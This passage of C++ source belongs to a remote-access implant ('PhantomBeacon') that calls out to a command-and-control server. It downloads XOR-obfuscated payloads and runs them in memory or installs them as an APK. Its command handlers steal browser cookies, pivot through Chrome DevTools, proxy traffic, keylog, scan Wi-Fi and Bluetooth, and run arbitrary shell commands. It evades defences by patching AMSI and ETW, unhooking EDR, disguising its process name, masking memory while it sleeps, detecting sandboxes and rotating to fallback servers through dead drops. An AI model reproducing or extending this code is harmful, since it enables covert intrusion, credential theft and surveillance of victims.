        // XOR-0xAA; the legacy on-disk PE route is not used by the beacon.
        std::string url = "/api/v1/remote_payload_windows_mem";
#elif defined(__ANDROID__) || defined(ANDROID)
        std::string url = "/api/v1/remote_payload_android";
#else
        std::string url = "/api/v1/remote_payload_linux";
#endif
        std::string bin = net::http_request(cfg, XOR_WDEC(XOR_WSTR(L"GET")).c_str(),
            std::wstring(url.begin(), url.end()).c_str(), "", cfg.beacon_id);
        if (bin.size() < 4096 || bin.find("Payload") != std::string::npos) {
            // Show the server's own words: a bare byte count turned a 401
            // ("Unauthorized", 12 bytes) into a guessing game.
            return XOR_DEC(XOR_STR("REMOTE_ERROR: module binary unavailable ")).c_str() +
                   std::to_string(bin.size()) + " (" + bin.substr(0, 60) + ")";
        }
#ifdef _WIN32
        // Reflective PIC path: the C2 serves loader+remote-PE XOR-0xAA, so
        // nothing is written to %TEMP% and no child process is created.
        // The loader maps the PE in this process, resolves imports/relocs/
        // TLS callbacks and calls its entry point. The remote module keeps
        // its own compiled C2 config (argv is ignored when the inherited
        // beacon command line is not a valid host/port pair).
        std::vector<unsigned char> mem(bin.begin(), bin.end());
        for (auto& octet : mem) octet = (unsigned char)(octet ^ 0xAA);
        std::string mem_err;
        if (inmemory::run_shellcode(mem, &mem_err)) {
            return XOR_DEC(XOR_STR("Remote session module deployed in-memory (no disk); interact via `beacons`")).c_str();
        }
        return XOR_DEC(XOR_STR("REMOTE_ERROR: reflective in-memory exec failed: ")).c_str() + mem_err;
#elif defined(__ANDROID__) || defined(ANDROID)
        // Android: the module is an APK (MediaProjection capture +
        // AccessibilityService input). A memfd exec cannot start an APK —
        // install it and launch the bootstrap activity instead.
        {
            std::string path = "/data/local/tmp/.srv" +
                               std::to_string(getpid()) + ".apk";
            FILE* f = fopen(path.c_str(), "wb");
            if (!f) return XOR_DEC(XOR_STR("REMOTE_ERROR: cannot write APK")).c_str();
            fwrite(bin.data(), 1, bin.size(), f);
            fclose(f);
            std::string cmd = "pm install -g " + path +
                              " >/dev/null 2>&1 && am start -n com.phantom.remote/.MainActivity";
            int rc = std::system(cmd.c_str());
            remove(path.c_str());
            if (rc != 0)
                return XOR_DEC(XOR_STR("REMOTE_ERROR: APK install failed (need shell/root)")).c_str();
            return XOR_DEC(XOR_STR("Remote session module (APK) deployed; interact via `beacons`")).c_str();
        }
#else
        // POSIX: run from a memfd (no disk trace).
        // `bin` is the raw HTTP body; run_binary takes the bytes as a
        // vector (the same type the mem-run path decodes), so convert here
        // instead of relying on an implicit string->vector conversion that
        // does not exist (this broke the beacon-syntax job).
        std::vector<unsigned char> bin_bytes(bin.begin(), bin.end());
        if (inmemory::run_binary(bin_bytes)) {
            return XOR_DEC(XOR_STR("Remote session module deployed in-memory; interact via `beacons`")).c_str();
        }
        return XOR_DEC(XOR_STR("REMOTE_ERROR: memfd exec failed")).c_str();
#endif
    }
    else if (action == XOR_DEC(XOR_STR("socks")).c_str()) {
        int localPort;
        if (iss >> localPort) {
            return proxy::start_socks(localPort);
        }
        return XOR_DEC(XOR_STR("Usage: socks <local_port>")).c_str();
    }
    else if (action == XOR_DEC(XOR_STR("socks-stop")).c_str()) {
        return proxy::stop_socks();
    }
#ifdef _WIN32
    else if (action == XOR_DEC(XOR_STR("smb-pipe")).c_str()) {
        std::string pipeName;
        std::getline(iss >> std::ws, pipeName);
        return smb::start_smb_pipe(pipeName);
    }
    else if (action == XOR_DEC(XOR_STR("smb-pipe-stop")).c_str()) {
        return smb::stop_smb_pipe();
    }
#endif
    else if (action == XOR_DEC(XOR_STR("browser-pivot")).c_str()) {
        int localPort;
        if (iss >> localPort) {
            unsigned long pid = 0;
            std::string pidStr;
            if (iss >> pidStr) {
                try {
                    pid = std::stoul(pidStr);
                } catch (...) { pid = 0; }
            }
            return browser_pivot::start_pivot(localPort, pid);
        }
        return XOR_DEC(XOR_STR("Usage: browser-pivot <local_port> [pid]")).c_str();
    }
    else if (action == XOR_DEC(XOR_STR("browser-pivot-stop")).c_str()) {
        return browser_pivot::stop_pivot();
    }
    else if (action == XOR_DEC(XOR_STR("browser-list")).c_str()) {
        return browser_pivot::list_browsers();
    }

    else if (action == XOR_DEC(XOR_STR("wlan-scan")).c_str()) {
        return wlan_scan::scan();
    }
    else if (action == XOR_DEC(XOR_STR("wlan-locate")).c_str()) {
        return wlan_scan::scan_json();
    }
    else if (action == XOR_DEC(XOR_STR("bt-scan")).c_str()) {
        return bt_scan::scan();
    }
    else if (action == XOR_DEC(XOR_STR("bt-scan-json")).c_str()) {
        return bt_scan::scan_json();
    }
    else if (action == XOR_DEC(XOR_STR("netstat")).c_str()) {
        return netstat::format_connections();
    }
    else if (action == XOR_DEC(XOR_STR("netstat-json")).c_str()) {
        return netstat::format_connections_json();
    }
    else if (action == XOR_DEC(XOR_STR("cookies")).c_str()) {
        return cookie_stealer::format_cookies();
    }
    else if (action == XOR_DEC(XOR_STR("cookies-json")).c_str()) {
        return cookie_stealer::format_cookies_json();
    }
    else if (action == XOR_DEC(XOR_STR("cdp-launch")).c_str()) {
        int port = 9222;
        iss >> port;
        return cdp_pivot::launch_and_connect(port);
    }
    else if (action == XOR_DEC(XOR_STR("cdp-cookies")).c_str()) {
        int port = 9222;
        iss >> port;
        return cdp_pivot::cdp_cookies(port);
    }
    else if (action == XOR_DEC(XOR_STR("cdp-eval")).c_str()) {
        int port = 9222;
        iss >> port;
        std::string expr;
        std::getline(iss >> std::ws, expr);
        if (expr.empty()) return "Usage: cdp-eval <expression>";
        return cdp_pivot::cdp_evaluate(expr, port);
    }
    else if (action == XOR_DEC(XOR_STR("cdp-nav")).c_str()) {
        int port = 9222;
        iss >> port;
        std::string url;
        std::getline(iss >> std::ws, url);
        if (url.empty()) return "Usage: cdp-nav <url>";
        return cdp_pivot::cdp_navigate(url, port);
    }
    else if (action == XOR_DEC(XOR_STR("cdp-fetch")).c_str()) {
        int port = 9222;
        iss >> port;
        std::string url;
        std::getline(iss >> std::ws, url);
        if (url.empty()) return "Usage: cdp-fetch <url>";
        return cdp_pivot::cdp_fetch(url, port);
    }
    // Unknown built-in: execute as OS shell command (C2 interact mode)
    return run_shell_command(cmd);
}


// ── Generate Beacon ID ─────────────────────────────────────────────────────

std::string generate_beacon_id() {
#ifdef _WIN32
    char computer[256] = {0};
    DWORD csize = sizeof(computer);
    GetComputerNameA(computer, &csize);
    char hex[9];
    srand(static_cast<unsigned>(time(nullptr)) ^ GetCurrentProcessId());
    snprintf(hex, sizeof(hex), "%04X%04X", rand() & 0xFFFF, rand() & 0xFFFF);
    return std::string(XOR_DEC(XOR_STR("WIN-")).c_str()) + computer + "-" + hex;
#else
    char hostname[256] = {0};
    gethostname(hostname, sizeof(hostname));
    char hex[9];
    srand(static_cast<unsigned>(time(nullptr)) ^ getpid());
    snprintf(hex, sizeof(hex), "%04X%04X", rand() & 0xFFFF, rand() & 0xFFFF);
    return std::string(XOR_DEC(XOR_STR("LNX-")).c_str()) + hostname + "-" + hex;
#endif
}


// ── Beacon Main Loop ──────────────────────────────────────────────────────

#if PHANTOM_SHELL_TRACE
// Diagnostic-only: log the faulting instruction and the return address that
// led there, then let Windows handle it normally. Without this a crash inside
// CreateProcessA is just "BEX64 at an address" in the event log with no caller.
static LONG CALLBACK _phantom_trace_veh(PEXCEPTION_POINTERS info) {
    static volatile LONG in_handler = 0;
    if (!info || !info->ExceptionRecord || !info->ContextRecord)
        return EXCEPTION_CONTINUE_SEARCH;
    // A fault while logging would re-enter this handler for ever.
    if (InterlockedExchange(&in_handler, 1) != 0)
        return EXCEPTION_CONTINUE_SEARCH;

    const EXCEPTION_RECORD* er = info->ExceptionRecord;
    CONTEXT* ctx = info->ContextRecord;
    void* ret = nullptr;
    void* ret2 = nullptr;
    if (_ph_readable(reinterpret_cast<const void*>(ctx->Rsp), sizeof(void*)))
        ret = *reinterpret_cast<void**>(ctx->Rsp);
    if (_ph_readable(reinterpret_cast<const void*>(ctx->Rsp + sizeof(void*)),
                     sizeof(void*)))
        ret2 = *reinterpret_cast<void**>(ctx->Rsp + sizeof(void*));

    char buf[512];
    snprintf(buf, sizeof(buf),
             "ex:%08lx flags=%08lx nparams=%lu addr=%p rip=%p rsp=%p rbp=%p "
             "rax=%p rcx=%p rdx=%p r8=%p r9=%p",
             static_cast<unsigned long>(er->ExceptionCode),
             static_cast<unsigned long>(er->ExceptionFlags),
             static_cast<unsigned long>(er->NumberParameters),
             er->ExceptionAddress, reinterpret_cast<void*>(ctx->Rip),
             reinterpret_cast<void*>(ctx->Rsp), reinterpret_cast<void*>(ctx->Rbp),
             reinterpret_cast<void*>(ctx->Rax), reinterpret_cast<void*>(ctx->Rcx),
             reinterpret_cast<void*>(ctx->Rdx), reinterpret_cast<void*>(ctx->R8),
             reinterpret_cast<void*>(ctx->R9));
    media_utils::xtrace(buf);

    snprintf(buf, sizeof(buf), "ex:ret=%p ret2=%p info0=%p info1=%p",
             ret, ret2,
             er->NumberParameters > 0
                 ? reinterpret_cast<void*>(er->ExceptionInformation[0]) : nullptr,
             er->NumberParameters > 1
                 ? reinterpret_cast<void*>(er->ExceptionInformation[1]) : nullptr);
    media_utils::xtrace(buf);

    for (const char* label : {"fault", "rip"}) {
        const void* addr = label[0] == 'f'
            ? er->ExceptionAddress : reinterpret_cast<const void*>(ctx->Rip);
        MEMORY_BASIC_INFORMATION mbi{};
        SIZE_T q = VirtualQuery(addr, &mbi, sizeof(mbi));
        snprintf(buf, sizeof(buf),
                 "ex:%s=%p vq=%llu base=%p alloc=%p state=%lx prot=%lx type=%lx",
                 label, addr, static_cast<unsigned long long>(q),
                 mbi.BaseAddress, mbi.AllocationBase,
                 static_cast<unsigned long>(mbi.State),
                 static_cast<unsigned long>(mbi.Protect),
                 static_cast<unsigned long>(mbi.Type));
        media_utils::xtrace(buf);
    }

    _ph_trace_image();
    InterlockedExchange(&in_handler, 0);
    return EXCEPTION_CONTINUE_SEARCH;
}
#endif

extern "C" void beacon_main(int argc, char** argv) {
    // The anti-analysis gate lives further down, AFTER the transport config
    // exists, so a refusal can report WHY instead of exiting in silence.
#if PHANTOM_SHELL_TRACE
    AddVectoredExceptionHandler(1, _phantom_trace_veh);
    {
        char img[96];
        snprintf(img, sizeof(img), "veh:installed img=%p",
                 reinterpret_cast<void*>(&_phantom_trace_veh));
        media_utils::xtrace(img);
    }
    // Optional main-thread check: the same CreateProcess call on the thread the
    // reflective loader attached to. If this succeeds while the task worker
    // faults, the worker/CRT path is the problem; if it also faults, the
    // mapped image's call into kernelbase is not thread-specific.
    {
        char en[8]{};
        if (GetEnvironmentVariableA("PHANTOM_SPAWN_PROBE_MAIN", en, sizeof(en)) > 0) {
            media_utils::xtrace("probe:main:enter");
            _ph_trace_image();
            HMODULE k32m = GetModuleHandleA("kernel32.dll");
            HMODULE kbm = GetModuleHandleA("kernelbase.dll");
            void* gpaAm = k32m ? reinterpret_cast<void*>(
                GetProcAddress(k32m, "CreateProcessA")) : nullptr;
            void* kbAm = kbm ? reinterpret_cast<void*>(
                GetProcAddress(kbm, "CreateProcessA")) : nullptr;
            _ph_spawn_attempt("main-kb-a", false, false, false, kbAm);
            _ph_spawn_attempt("main-gpa-a", false, false, false, gpaAm);
            media_utils::xtrace("probe:main:done");
        }
    }
#endif

#ifdef _WIN32
    // ── Single-instance guard ────────────────────────────────────────────
    // The no-disk RunKey rebirth can fire while an earlier beacon instance
    // is still alive (logon while the operator session runs): two beacons
    // with the SAME HMAC identity double-poll, race tasks and break the
    // server's nonce tracking. A per-identity mutex in the user session
    // makes the duplicate exit silently within seconds.
    //
    // The mutex is created WITHOUT initial ownership and the process WAITS
    // for it instead of exiting on sight: a successful `migrate` spawns the
    // successor while this instance is still sending the result and tearing
    // down, so the successor must be able to wait out the old owner (the
    // kernel marks the mutex abandoned when that process dies). Live defect
    // 2026-10-19: the successor saw ERROR_ALREADY_EXISTS, exited within
    // milliseconds, and the original then exited too — migration left
    // NOTHING alive. A genuine duplicate (RunKey rebirth while the senior
    // lives) simply times out and lets the senior instance keep working.
    {
        std::string mux = std::string("Local\\PhantomBeacon-") +
#ifdef BEACON_AUTH_ENABLED
            BEACON_AUTH_ID;
#else
            "default";
#endif
        HANDLE hMux = CreateMutexA(nullptr, FALSE, mux.c_str());
        if (hMux) {
            DWORD wait = WaitForSingleObject(hMux, 30000);
            if (wait != WAIT_OBJECT_0 && wait != WAIT_ABANDONED) {
                CloseHandle(hMux);
                return;   // duplicate birth — let the senior instance work
            }
        }
        // hMux intentionally leaked: held for process lifetime.
    }

    srand(static_cast<unsigned>(time(nullptr)) ^ GetCurrentProcessId());
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return;
    #ifndef DISABLE_ANTI
    // Hide beacon from PEB module lists (Process Explorer / EDR module walk)
    peb_unlink::hide_module();
    // HW-breakpoint unhooking: arm a debug register on a clean ntdll
    // 'syscall; ret' gadget and route sensitive syscalls through the VEH
    // so EDR userland hooks are bypassed WITHOUT patching ntdll .text
    // (nothing for the integrity monitor to flag).
    anti::install_hwbp_engine();
    #endif
#else
    srand(static_cast<unsigned>(time(nullptr)) ^ getpid());
    #ifndef DISABLE_ANTI
    // POSIX PEB-equivalent: drop our module from the loader's link_map
    // (Linux); on macOS the dyld image list is read-only, so it is a no-op.
    peb_unlink::hide_module();
    #endif
#endif

#ifndef DISABLE_ANTI
    // Process masquerade (docs/beacon_platform_matrix.md) — documented on
    // every platform but never invoked, so the capability was inert. Windows
    // rewrites the PEB `FullDllName`; Linux/Android use prctl(PR_SET_NAME);
    // macOS has no supported API and the helper is a documented no-op.
#ifdef _WIN32
    anti::masquerade::rename_process(L"svchost.exe");
#else
    anti::masquerade::rename_process(L"kworker/0:1");
#endif
#endif

#ifndef DISABLE_ANTI
    // AMSI / ETW patching (docs/beacon_platform_matrix.md). Windows really
    // patches `AmsiScanBuffer` and `EtwEventWrite`; on POSIX there is no
    // in-process equivalent to hook, so both are documented no-ops and one
    // call site is correct on every platform. These were defined but never
    // CALLED, which left a capability the matrix promised inert.
    anti::patch_amsi();
    anti::patch_etw();
#endif

    // Held by shared_ptr so a DETACHED task worker cannot read a destroyed
    // config: `cfg` is used by reference everywhere below, and
    // run_task_with_timeout hands the same shared_ptr to the worker, so the
    // object outlives every thread that may still be reading it.
    auto cfg_owner = std::make_shared<net::C2Config>();
    net::C2Config& cfg = *cfg_owner;
#if BEACON_AUTH_ENABLED
    cfg.beacon_id = BEACON_AUTH_ID;
#else
    cfg.beacon_id = generate_beacon_id();
#endif
#ifdef _WIN32
    cfg.host      = std::wstring(C2_HOST, C2_HOST + strlen(C2_HOST));
#else
    cfg.host      = C2_HOST;
#endif
    cfg.port      = C2_PORT;
    cfg.sleep_ms  = 5000;
    cfg.base_sleep_ms = 5000;
    cfg.jitter    = 30;
    // Endpoint ladder + proxy posture from the build config: a single
    // compiled-in host dies with the first filtered address, and a beacon
    // that ignores the system proxy never calls home from a managed network.
    cfg.seed_ladder(C2_HOST, C2_HOSTS, C2_HOST_PINS, C2_HOST_PUBKEY_PINS);
    cfg.proxy = C2_PROXY;
    // LAST RING: consulted only after the whole ladder keeps failing
    cfg.dead_drop = C2_DEADDROP;

    if (argc >= 2) {
        std::string host_str(argv[1]);
        // an operator-supplied host becomes the FIRST rung without throwing
        // away the compiled-in fallbacks behind it
        cfg.prefer_endpoint(host_str);
        if (argc >= 3) cfg.port = std::atoi(argv[2]);
        if (argc >= 4) cfg.use_https = std::atoi(argv[3]) != 0;
    }
#if BEACON_AUTH_ENABLED
    std::vector<BYTE> persisted_auth_secret;
    if (crypto::load_auth_secret(persisted_auth_secret)) {
        std::copy(persisted_auth_secret.begin(), persisted_auth_secret.end(),
                  cfg.auth_secret.begin());
    }
#endif

#ifndef DISABLE_ANTI
    // ── Anti-analysis gate ──────────────────────────────────────────────
    // Refuse to operate under a debugger or in a virtualised sandbox. This
    // used to `stalling_delay(50); return;` in SILENCE, so the operator saw
    // "no check-in" and could not tell a detected sandbox from a failed
    // exploit — two situations that call for different responses, and only
    // the target can say which one happened. Burn the sandbox's time, then
    // send ONE best-effort abort event so the C2 timeline names the reason.
    // The beacon never enters the task loop either way.
    {
        const char* abort_reason = nullptr;
        if (anti::is_debugger_present())      abort_reason = "debugger present";
        else if (anti::is_vm())               abort_reason = "virtualised/sandbox environment";
        if (abort_reason) {
            anti::stalling_delay(50);
            // Register the identity BEFORE the abort report: handle_result()
            // refuses a result from any beacon the C2 has not seen check in
            // yet, and this gate runs before the loop's first check-in — so
            // without this ping the event below is dropped as an unknown
            // beacon and the operator is back to the silence this fixes.
            net::checkin(cfg);
            std::string event = std::string(XOR_DEC(XOR_STR("BEACON_ABORT: ")).c_str())
                + abort_reason
                + XOR_DEC(XOR_STR(" - the beacon refused to start")).c_str();
            net::send_result(cfg, XOR_DEC(XOR_STR("beacon-startup")).c_str(), event);
#ifdef _WIN32
            net::g_ctx.cleanup();
#endif
            return;
        }
    }
#endif

    bool alive = true;
    auto escape_json = [](const std::string& s) {
        std::string res;
        for (unsigned char c : s) {
            if (c == '"') res += "\\\"";
            else if (c == '\\') res += "\\\\";
            else if (c == '\n') res += "\\n";
            else if (c == '\r') res += "\\r";
            else if (c == '\t') res += "\\t";
            else if (c < 0x20) {
                // raw control bytes are invalid in JSON: encode as \u00XX
                char hex[7];
                snprintf(hex, sizeof(hex), "\\u%04X", c);
                res += hex;
            }
            else res += static_cast<char>(c);
        }
        return res;
    };

    // Failed results are retained in order. A single failed upload must not
    // overwrite results produced by later tasks in the same check-in.
    std::vector<std::pair<std::string, std::string>> pending_results;
    int consecutive_failures = 0;

    // ── Health self-report counters ────────────────────────────────────
    unsigned long checkins_ok = 0, checkins_fail = 0, tasks_done = 0;
    unsigned long results_pending_peak = 0;
    unsigned long long uptime_start = (unsigned long long)time(nullptr);
    std::string last_error;

    // mirror into the globals the `health` command reads
    g_uptime_start = uptime_start;

    while (alive) {
        std::string telemetry = std::string(XOR_DEC(XOR_STR("{\"build_id\":\"")).c_str()) + BUILD_ID +
                    XOR_DEC(XOR_STR("\",\"sysinfo\":\"")).c_str() + escape_json(recon::get_sysinfo()) +
                    XOR_DEC(XOR_STR("\"}")).c_str();

#if C2_DEADDROP_BOOTSTRAP
        // DEAD-DROP-FIRST: resolve the live endpoint ONCE, before the very
        // first check-in, so the compiled address is only a fallback rung.
        // A failure is a plain no-op — the compiled ladder takes over and
        // the ordinary last-ring path retries after `dd_after` failures.
        if (!cfg.dd_bootstrap_done) {
            cfg.dd_bootstrap_done = true;
            if (!cfg.dead_drop.empty() && net::refresh_from_dead_drop(cfg)) {
                cfg.dd_failures = 0;
            }
        }
#endif

        std::string response = net::checkin(cfg, telemetry);
#if PHANTOM_TASK_TRACE
        media_utils::xtrace(response.empty() ? "t:resp=EMPTY"
            : ("t:resp=" + std::to_string(response.size())).c_str());
#endif

        if (!response.empty()) {
            consecutive_failures = 0;
            ++checkins_ok;
            g_checkins_ok = checkins_ok;
            cfg.on_success();
            // server reachable again: restore the operator-configured base
            // sleep (exponential backoff from the outage must not stick)
            if (cfg.sleep_ms != cfg.base_sleep_ms) cfg.sleep_ms = cfg.base_sleep_ms;
            // Retry previously undelivered results first. The sends are
            // INDEPENDENT: one result the transport refuses (a single
            // oversized/malformed message) must not stall the results
            // behind it, which is exactly what the old `else break;` did.
            // `drain_pending_results` keeps trying the rest and only stops
            // the round once a full batch has failed in a row (the link,
            // not the message, is the problem). An item is removed ONLY
            // after the transport reports success; the server de-duplicates
            // retries if the response itself was lost.
            task::drain_pending_results(
                pending_results,
                [&cfg](const std::string& task_id, const std::string& output) {
                    return net::send_result(cfg, task_id, output);
                });
            auto tasks = json_mini::parse_tasks(response);
#if PHANTOM_TASK_TRACE
            media_utils::xtrace(("t:tasks=" + std::to_string(tasks.size())).c_str());
#endif
            for (auto& task : tasks) {
                ++tasks_done;
                g_tasks_done = tasks_done;
                // Per-command budget: media captures run for the operator-
                // requested duration plus a margin; everything else gets the
                // default (a camera ReadSample hang must not wedge the loop).
                int budget_ms = DEFAULT_TASK_TIMEOUT_MS;
                {
                    std::istringstream tss(task.command);
                    std::string tok;
                    tss >> tok;
                    int dur = 0;
                    tss >> dur;
                    if ((tok == "audio" || tok == "screen-record" ||
                         tok == "screen-record-live" ||
                         tok == "screen-stream") && dur > 0) {
                        budget_ms = dur * 1000 + 15000;
                    } else if (tok == "camera") {
                        budget_ms = 45000; // MF init + frame grabs can be slow
                    }
                }
#if PHANTOM_TASK_TRACE
                media_utils::xtrace(("t:run=" + task.command).c_str());
#endif
                std::string output = run_task_with_timeout(task.command, cfg_owner, budget_ms);
#if PHANTOM_TASK_TRACE
                media_utils::xtrace(("t:out=" + std::to_string(output.size())).c_str());
#endif
                if (output.size() >= 4 && output[0] == '\x01' && output[1] == '\x02') {
                    if (output[2] == 'E' && output[3] == 'X') {
                        alive = false;
                        // Ack the kill so the task does not stay queued; a
                        // dead link must not keep the implant alive.
                        net::send_result(cfg, task.task_id, output);
                        break;
                    }
                    if (output[2] == 'M' && output[3] == 'G') {
                        output = output.substr(4);
                        if (!net::send_result(cfg, task.task_id, output)) {
                            pending_results.emplace_back(task.task_id, output);
                        }
                        alive = false;
                        break;
                    }
                }
                bool sent = net::send_result(cfg, task.task_id, output);
#if PHANTOM_TASK_TRACE
                media_utils::xtrace(sent ? "t:sent=1" : "t:sent=0");
#endif
                if (!sent) {
                    pending_results.emplace_back(task.task_id, output);
                }
            }
            // drain progressive screen-stream segments (true live): each
            // segment is sent as its own result so the C2/UI see it now.
            {
                static unsigned long g_live_seq = 0;
                for (auto& seg : media_screen::stream::drain()) {
                    std::string sid = "live-seg-" + std::to_string(++g_live_seq);
                    if (!net::send_result(cfg, sid, seg)) {
                        pending_results.emplace_back(sid, seg);
                    }
                }
            }
#ifdef _WIN32
            // smb-pipe commands accepted on the named pipe are drained here
            // (they are regular beacon commands executed locally)
            std::string piped;
            while ((piped = smb::pop_pending_command()) != "") {
                std::string out = run_task_with_timeout(piped, cfg_owner);
                if (!net::send_result(cfg, XOR_DEC(XOR_STR("smb-pipe")).c_str(), out)) {
                    pending_results.emplace_back(XOR_DEC(XOR_STR("smb-pipe")).c_str(), out);
                }
            }
#endif
        } else {
            // server unreachable: exponential backoff, capped at 60s
            consecutive_failures++;
            ++checkins_fail;
            g_checkins_fail = checkins_fail;
            last_error = "checkin fail #" + std::to_string(consecutive_failures);
            // Endpoint ladder: after a per-endpoint failure budget the beacon
            // rotates to the next C2 (redirector behind a taken-down host,
            // filtered address, provider outage). The window is reset after
            // a move so the backoff restarts from the base sleep.
            if (cfg.on_failure()) {
                last_error += " -> rotating to " + cfg.endpoint();
                cfg.sleep_ms = cfg.base_sleep_ms;
                consecutive_failures = 1;
                // cached connection state belongs to the OLD endpoint
#ifdef _WIN32
                net::g_ctx.cleanup();
#endif
            }
            // LAST RING: when the ladder keeps failing, consult the dead drop
            // for a fresh endpoint. Its own counter bounds the cost: a dead
            // drop that is ALSO unreachable costs one request per window, not
            // one per check-in.
            if (!cfg.dead_drop.empty() && ++cfg.dd_failures >= cfg.dd_after) {
                cfg.dd_failures = 0;
                if (net::refresh_from_dead_drop(cfg)) {
                    last_error += " -> dead-drop endpoint " + cfg.endpoint();
                    cfg.sleep_ms = cfg.base_sleep_ms;
                    consecutive_failures = 1;
                }
            }
            g_last_error = last_error;
            if (consecutive_failures > 1) {
                cfg.sleep_ms = std::min(60000, cfg.sleep_ms * 2);
            }
        }
        if (pending_results.size() > results_pending_peak)
            results_pending_peak = (unsigned long)pending_results.size();

        int jitter_sleep = cfg.get_sleep_ms();
#ifdef _WIN32
        // Masked sleep (Ekko upgrade): RC4-encrypts RW sections AND the live
        // thread stack, spoofs the return chain to a signed-module address,
        // then waits on a high-resolution timer. A memory scan during sleep
        // sees ciphertext; a stack scan sees legitimate system frames.
        #ifndef DISABLE_ANTI
        ekko::ekko_sleep_masked(jitter_sleep);
        #else
        Sleep(jitter_sleep);
        #endif
#else
        // Linux/macOS: masked sleep (RC4 over the idle stack region), the
        // POSIX counterpart of the Windows Ekko path; keylogger runs in its
        // own thread.
        #ifndef DISABLE_ANTI
        ekko::ekko_sleep_masked(jitter_sleep);
        #else
        Sleep(jitter_sleep);
        #endif
#endif
        keylogger::poll();
    }

#ifdef _WIN32
    net::cleanup();
    WSACleanup();
#endif
    // Shut down: cancel every stranded task worker so no result is published
    // for work the C2 already considers dead.
    //
    // drain() does not wait for a blocked worker, because it cannot: the
    // cancel is cooperative and is only observed once work() returns. A
    // thread still trapped in a syscall dies with the process, and the count
    // is reported rather than hidden -- "we gave up on N workers" is
    // information, silence is not.
    const size_t abandoned = task::Registry::instance().drain();
    if (abandoned) {
        std::fprintf(stderr,
                     "[beacon] %zu task worker(s) still running at shutdown\n",
                     abandoned);
    }
}


// ── Entry Point ────────────────────────────────────────────────────────────

#ifdef _WIN32
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
    if (injection::self_hollow())
        return 0;

    std::vector<std::string> args;
    args.push_back("beacon.exe");
    if (lpCmdLine && strlen(lpCmdLine) > 0) {
        std::istringstream iss(lpCmdLine);
        std::string token;
        while (iss >> token) args.push_back(token);
    }

    std::vector<char*> argv_ptrs;
    for (auto& a : args) argv_ptrs.push_back(&a[0]);

    beacon_main(static_cast<int>(argv_ptrs.size()), argv_ptrs.data());
    return 0;
}
#else
int main(int argc, char** argv) {
    beacon_main(argc, argv);
    return 0;
}
#endif

